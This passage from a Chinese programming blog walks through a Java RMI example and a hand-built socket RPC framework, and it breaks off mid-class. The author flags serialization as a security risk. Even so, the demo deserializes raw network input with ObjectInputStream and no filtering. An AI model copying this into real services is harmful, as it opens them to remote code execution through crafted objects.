<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Factory</span> <span class="token keyword">extends</span> <span class="token class-name">Remote</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">/**
     * 查找用户
     * 
     * @param userId
     * @return
     * @throws RemoteException
     */</span>
    <span class="token class-name">User</span> <span class="token function">findUser</span><span class="token punctuation">(</span><span class="token class-name">String</span> userId<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>Main 启动类</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RmiClient</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span> args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">NotBoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 连接到服务器localhost，端口1099，也就是去找注册中心:</span>
        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span> <span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 查找名称为"Factory"的服务并强制转型为Factory接口，这里我们发现我们不需要知道服务端的地址，看注册中心有没有该服务，直接调用即可</span>
        <span class="token class-name">Factory</span> worldClock <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Factory</span><span class="token punctuation">)</span> registry<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"Factory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 正常调用接口方法，这里的调用实际上去服务端进行计算的，本地根本没有实现:</span>
        <span class="token class-name">User</span> user <span class="token operator">=</span> worldClock<span class="token punctuation">.</span><span class="token function">findUser</span><span class="token punctuation">(</span><span class="token string">"110"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 打印调用结果:</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    这里其实就已经可以远程服务调用了。就是调用了几个Java自身的接口，统一一下返回类型。是不是感觉很清晰，简单。你也不用引入啥其他玩意儿。建议读者自己再执行一遍。理一下思路。</p>
<p>​    现在我写的就一个很简单的Demo，常见的轮训访问，心跳机制啥的都没有。但对于初次接触的人感觉还是很友善的。那这个RMI看着这么简单方便，为啥后面还有个RPC框架呢。从我的理解，最直接的问题：</p>
<ol>
<li>RMI只针对JVM间进行服务，如果我们用其他编程语言没法进行使用调用。</li>
<li>序列化与反序列化机制。这里牵扯到了网络安全问题。<ol>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzU2NzkxMDUyNg==&amp;mid=2247486261&amp;idx=1&amp;sn=5bce20d898eba670b4b129a8a3092449&amp;utm_source=tuicool&amp;utm_medium=referral%E3%80%82%E7%AE%80%E5%8D%95%E6%9D%A5%E8%AE%B2%E6%94%BB%E5%87%BB%E8%80%85%E5%B0%86%E4%B8%80%E4%BA%9B%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%A4%B9%E6%9D%82%E5%88%B0%E7%B1%BB%E5%AF%B9%E8%B1%A1%E4%B8%AD%EF%BC%8C%E8%BF%9B%E8%A1%8C%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%8E%E5%8F%91%E9%80%81%EF%BC%8C%E4%BD%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%90%8E%E4%BC%9A%E8%87%AA%E5%8A%A8%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E3%80%82">https://mp.weixin.qq.com/s?__biz=MzU2NzkxMDUyNg==&amp;mid=2247486261&amp;idx=1&amp;sn=5bce20d898eba670b4b129a8a3092449&amp;utm_source=tuicool&amp;utm_medium=referral。简单来讲攻击者将一些恶意代码夹杂到类对象中，进行序列化后发送，你反序列化后会自动执行恶意代码。</a></li>
</ol>
</li>
</ol>
<h1 id="高级阶段（分布式服务调用）"><a href="#高级阶段（分布式服务调用）" class="headerlink" title="高级阶段（分布式服务调用）"></a>高级阶段（分布式服务调用）</h1><p>终于到了RPC框架了，这里我是看到<code>b站：汤姆还在写代码</code>中对grpc讲解 进行学习的。建议去看看原视频，讲的很细节。这里我直接贴代码了，内容还是比较多的。也可以直接下载源码：<a href="https://github.com/tomstillcoding/Simple-RPC">https://github.com/tomstillcoding/Simple-RPC</a></p>
<blockquote>
<p>代码相当于手撸一个简单的RPC框架，我们简单看一下项目结构</p>
</blockquote>
<p>![image-20220919224149858](/Users/qinsicheng/Library/Application Support/typora-user-images/image-20220919224149858.png)</p>
<p>![image-20220919224307873](/Users/qinsicheng/Library/Application Support/typora-user-images/image-20220919224307873.png)</p>
<blockquote>
<p>我们会先看客户端，服务端的启动类，然后一步步挖掘</p>
</blockquote>
<h2 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestClient</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 获取RpcService，相当于就是连接注册中心</span>
        <span class="token class-name">RpcClientProxy</span> proxy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RpcClientProxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 从注册中心中找需要使用的接口</span>
        <span class="token class-name">HelloService</span> helloService <span class="token operator">=</span> proxy<span class="token punctuation">.</span><span class="token function">getService</span><span class="token punctuation">(</span><span class="token class-name">HelloService</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 构造出请求对象HelloRequest，也就是定义好的请求参数</span>
        <span class="token class-name">HelloRequest</span> helloRequest <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloRequest</span><span class="token punctuation">(</span><span class="token string">"tom"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// rpc调用并返回结果对象HelloResponse</span>
        <span class="token class-name">HelloResponse</span> helloResponse <span class="token operator">=</span> helloService<span class="token punctuation">.</span><span class="token function">hello</span><span class="token punctuation">(</span>helloRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 从HelloResponse中获取msg</span>
        <span class="token class-name">String</span> helloMsg <span class="token operator">=</span> helloResponse<span class="token punctuation">.</span><span class="token function">getMsg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 打印msg</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>helloMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>初始化注册中心</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RpcClientProxy</span> <span class="token keyword">implements</span> <span class="token class-name">InvocationHandler</span> <span class="token punctuation">&#123;</span>
    <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>
  	<span class="token comment">// 这里通过反射获取动态代理对象</span>
    <span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token class-name">T</span> <span class="token function">getService</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> clazz<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>
                clazz<span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>clazz<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
                <span class="token keyword">this</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

  	<span class="token comment">// 这里你可以理解为当你调用对象方法时，实际上你拿到的是一个动态代理后的对象进行调用方法，而实际调用的方法信息通过Socket传输给了服务端，然后结果再通过Socket回传，再返回到你本机。可以说很是巧妙</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span> proxy<span class="token punctuation">,</span> <span class="token class-name">Method</span> method<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 1、将接口需要调用的方法的各类信息打包成一个请求体，这里使用了Builder模式【codec层】</span>
        <span class="token class-name">RpcRequestBody</span> rpcRequestBody <span class="token operator">=</span> <span class="token class-name">RpcRequestBody</span><span class="token punctuation">.</span><span class="token function">builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">interfaceName</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getDeclaringClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">methodName</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">paramTypes</span><span class="token punctuation">(</span>method<span class="token punctuation">.</span><span class="token function">getParameterTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">parameters</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token comment">// 转化为二进制数组，用于IO传输</span>
        <span class="token class-name">ByteArrayOutputStream</span> baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>baos<span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>rpcRequestBody<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 2、创建RPC协议，将Header、Body的内容设置好（Body中存放调用编码）【protocol层】</span>
        <span class="token class-name">RpcRequest</span> rpcRequest <span class="token operator">=</span> <span class="token class-name">RpcRequest</span><span class="token punctuation">.</span><span class="token function">builder</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"version=1"</span><span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span>
                <span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 3、发送RpcRequest，获得RpcResponse</span>
        <span class="token class-name">RpcClientTransfer</span> rpcClient <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RpcClientTransfer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">RpcResponse</span> rpcResponse <span class="token operator">=</span> rpcClient<span class="token punctuation">.</span><span class="token function">sendRequest</span><span class="token punctuation">(</span>rpcRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 4、解析RpcResponse，也就是在解析rpc协议【protocol层】</span>
        <span class="token class-name">String</span> header <span class="token operator">=</span> rpcResponse<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> body <span class="token operator">=</span> rpcResponse<span class="token punctuation">.</span><span class="token function">getBody</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"version=1"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 将RpcResponse的body中的返回编码，解码成我们需要的对象Object并返回【codec层】</span>
            <span class="token class-name">ByteArrayInputStream</span> bais <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>bais<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">RpcResponseBody</span> rpcResponseBody <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">RpcResponseBody</span><span class="token punctuation">)</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> rpcResponseBody<span class="token punctuation">.</span><span class="token function">getRetObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>实际通过Socket发送信息</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RpcClientTransfer</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token class-name">RpcResponse</span> <span class="token function">sendRequest</span><span class="token punctuation">(</span><span class="token class-name">RpcRequest</span> rpcRequest<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 通过Socket进行连接</span>
        <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">Socket</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span> <span class="token number">9000</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">// 发送【transfer层】</span>
            <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 通过Socket发送</span>
            objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>rpcRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 这里必须刷新，将数据写出</span>
            objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">// 获取Socket传回来的请求体</span>
            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">RpcResponse</span><span class="token punctuation">)</span> objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> <span class="token operator">|</span> <span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a>服务端</h2><blockquote>
<p>启动类</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestServer</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 真正的rpc server，相当于注册中心，这里主要定义了一个线程池 和 一个监听器</span>
        <span class="token class-name">RpcServer</span> rpcServer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RpcServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 负责干活的实例</span>
        <span class="token class-name">HelloService</span> helloService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloServiceImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 向rpc server注册实例</span>
        rpcServer<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span>helloService<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 开始监听，每监听到一个请求，就创建一个线程去执行</span>
        rpcServer<span class="token punctuation">.</span><span class="token function">serve</span><span class="token punctuation">(</span><span class="token number">9000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>RPC的服务端，也可以理解为注册中心</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RpcServer</span> <span class="token punctuation">&#123;</span>
  	<span class="token comment">// 线程池</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">ExecutorService</span> threadPool<span class="token punctuation">;</span>
    <span class="token comment">// interfaceName -> interfaceImplementation object</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> registeredService<span class="token punctuation">;</span>

  	<span class="token comment">// 初始化线程池 和 服务容器</span>
    <span class="token keyword">public</span> <span class="token class-name">RpcServer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 线程数</span>
        <span class="token keyword">int</span> corePoolSize <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
        <span class="token comment">// 最大线程数</span>
        <span class="token keyword">int</span> maximumPoolSize <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span>
        <span class="token comment">// 线程存活时间</span>
        <span class="token keyword">long</span> keepAliveTime <span class="token operator">=</span> <span class="token number">60</span><span class="token punctuation">;</span>
        <span class="token comment">// 线程容器</span>
        <span class="token class-name">BlockingQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Runnable</span><span class="token punctuation">></span></span> workingQueue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBlockingQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 线程工厂</span>
        <span class="token class-name">ThreadFactory</span> threadFactory <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">defaultThreadFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 创建线程池</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>threadPool <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadPoolExecutor</span><span class="token punctuation">(</span>corePoolSize<span class="token punctuation">,</span> maximumPoolSize<span class="token punctuation">,</span> keepAliveTime<span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">,</span> workingQueue<span class="token punctuation">,</span> threadFactory<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 注册服务的容器，没想到就是Map</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>registeredService <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 存储服务</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token class-name">Object</span> service<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 就是将该对象存储到容器中 key为接口名  value为具体服务</span>
        registeredService<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>service<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> service<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

  	<span class="token comment">// 监听服务</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">serve</span><span class="token punctuation">(</span><span class="token keyword">int</span> port<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 这里实际上也是用Socket连接</span>
        <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">ServerSocket</span> serverSocket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServerSocket</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"server starting..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">Socket</span> handleSocket<span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>handleSocket <span class="token operator">=</span> serverSocket<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"client connected, ip:"</span> <span class="token operator">+</span> handleSocket<span class="token punctuation">.</span><span class="token function">getInetAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// 如果有请求进来，这里会调用一个线程去执行</span>
                threadPool<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RpcServerWorker</span><span class="token punctuation">(</span>handleSocket<span class="token punctuation">,</span> registeredService<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>每个请求进入服务端后，记性相应的处理</p>
</blockquote>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RpcServerWorker</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span><span class="token punctuation">&#123;</span>

    <span class="token keyword">private</span> <span class="token class-name">Socket</span> socket<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> registeredService<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">RpcServerWorker</span><span class="token punctuation">(</span><span class="token class-name">Socket</span> socket<span class="token punctuation">,</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> registeredService<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>socket <span class="token operator">=</span> socket<span class="token punctuation">;</span>
